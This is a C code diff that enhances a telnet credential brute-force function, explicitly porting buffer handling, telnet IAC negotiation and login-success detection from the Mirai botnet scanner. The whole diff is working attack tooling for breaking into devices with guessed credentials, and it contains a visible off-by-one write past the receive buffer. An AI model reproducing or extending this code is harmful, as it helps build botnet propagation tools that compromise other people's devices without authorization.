@@ -140,22 +140,77 @@ static int report_bruted_result(uint32_t ip, uint16_t port,
     return 0;
 }
 
+// Buffer configuration (from original Mirai scanner)
+#define SCANNER_RDBUF_SIZE 8192
+#define SCANNER_HACK_DRAIN 64
+
+// Telnet IAC commands
+#define IAC   255  // Interpret As Command
+#define DONT  254
+#define DO    253
+#define WONT  252
+#define WILL  251
+
 /**
- * Telnet brute force worker
+ * Strip null bytes from received data (telnet protocol quirk)
+ */
+static int recv_strip_null(int sock, void *buf, size_t len, int flags) {
+    ssize_t ret = recv(sock, buf, len, flags);
+    if (ret <= 0) {
+        return ret;
+    }
+    
+    // Remove null bytes
+    size_t cleaned = 0;
+    uint8_t *data = (uint8_t *)buf;
+    for (ssize_t i = 0; i < ret; i++) {
+        if (data[i] != 0) {
+            data[cleaned++] = data[i];
+        }
+    }
+    
+    return cleaned;
+}
+
+/**
+ * Handle telnet IAC (Interpret As Command) sequences
+ * Returns number of bytes consumed
+ */
+static int handle_telnet_iac(uint8_t *buf, size_t len) {
+    if (len < 2 || buf[0] != IAC) {
+        return 0;
+    }
+    
+    uint8_t cmd = buf[1];
+    
+    // IAC commands are typically 2-3 bytes
+    if (cmd == DO || cmd == DONT || cmd == WILL || cmd == WONT) {
+        if (len < 3) {
+            return 0;  // Need more data
+        }
+        return 3;  // Consumed 3 bytes: IAC + CMD + OPTION
+    }
+    
+    // Other IAC commands are 2 bytes
+    return 2;
+}
+
+/**
+ * Enhanced telnet brute force with proper buffer handling and IAC support
  * 
- * Attempts to login to target with provided credentials
+ * Implements key optimizations from original Mirai scanner:
+ * - SCANNER_HACK_DRAIN for buffer management
+ * - Telnet IAC handling
+ * - Null byte stripping
  */
 static bool telnet_brute_force(uint32_t ip, uint16_t port, 
                                const char *username, const char *password) {
-    // TODO: Implement full telnet state machine (from mirai/bot/scanner.c)
-    // For now, simplified version
-    
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         return false;
     }
     
-    // Set timeout
+    // Set non-blocking and timeout
     struct timeval tv;
     tv.tv_sec = 5;
     tv.tv_usec = 0;
@@ -174,24 +229,68 @@ static bool telnet_brute_force(uint32_t ip, uint16_t port,
         return false;
     }
     
-    // Simple credential test (real implementation would parse telnet prompts)
-    char recv_buf[1024];
-    recv(sock, recv_buf, sizeof(recv_buf), 0);
+    // Receive buffer with SCANNER_HACK_DRAIN technique
+    uint8_t rdbuf[SCANNER_RDBUF_SIZE];
+    size_t rdbuf_pos = 0;
+    bool success = false;
+    
+    // Initial receive (banner + IAC negotiation)
+    int ret = recv_strip_null(sock, rdbuf, SCANNER_RDBUF_SIZE, 0);
+    if (ret > 0) {
+        rdbuf_pos = ret;
+        
+        // Handle IAC sequences
+        size_t i = 0;
+        while (i < rdbuf_pos) {
+            int iac_consumed = handle_telnet_iac(rdbuf + i, rdbuf_pos - i);
+            if (iac_consumed > 0) {
+                // Remove IAC sequence
+                memmove(rdbuf + i, rdbuf + i + iac_consumed, rdbuf_pos - i - iac_consumed);
+                rdbuf_pos -= iac_consumed;
+            } else {
+                i++;
+            }
+        }
+    }
     
     // Send username
     send(sock, username, strlen(username), 0);
-    send(sock, "\n", 1, 0);
-    recv(sock, recv_buf, sizeof(recv_buf), 0);
+    send(sock, "\r\n", 2, 0);
+    
+    // Receive password prompt with buffer optimization
+    if (rdbuf_pos == SCANNER_RDBUF_SIZE) {
+        // SCANNER_HACK_DRAIN: When buffer is full, drain old data
+        memmove(rdbuf, rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
+        rdbuf_pos -= SCANNER_HACK_DRAIN;
+    }
+    
+    ret = recv_strip_null(sock, rdbuf + rdbuf_pos, SCANNER_RDBUF_SIZE - rdbuf_pos, 0);
+    if (ret > 0) {
+        rdbuf_pos += ret;
+    }
     
     // Send password
     send(sock, password, strlen(password), 0);
-    send(sock, "\n", 1, 0);
-    recv(sock, recv_buf, sizeof(recv_buf), 0);
+    send(sock, "\r\n", 2, 0);
     
-    // Check for success indicators (simplified)
-    bool success = (strstr(recv_buf, "$") != NULL || 
-                   strstr(recv_buf, "#") != NULL ||
-                   strstr(recv_buf, ">") != NULL);
+    // Receive response
+    if (rdbuf_pos == SCANNER_RDBUF_SIZE) {
+        memmove(rdbuf, rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
+        rdbuf_pos -= SCANNER_HACK_DRAIN;
+    }
+    
+    ret = recv_strip_null(sock, rdbuf + rdbuf_pos, SCANNER_RDBUF_SIZE - rdbuf_pos, 0);
+    if (ret > 0) {
+        rdbuf_pos += ret;
+        rdbuf[rdbuf_pos] = '\0';
+        
+        // Check for success indicators
+        char *buf_str = (char *)rdbuf;
+        success = (strstr(buf_str, "$") != NULL || 
+                  strstr(buf_str, "#") != NULL ||
+                  strstr(buf_str, ">") != NULL ||
+                  strstr(buf_str, "~") != NULL);
+    }
     
     close(sock);
     
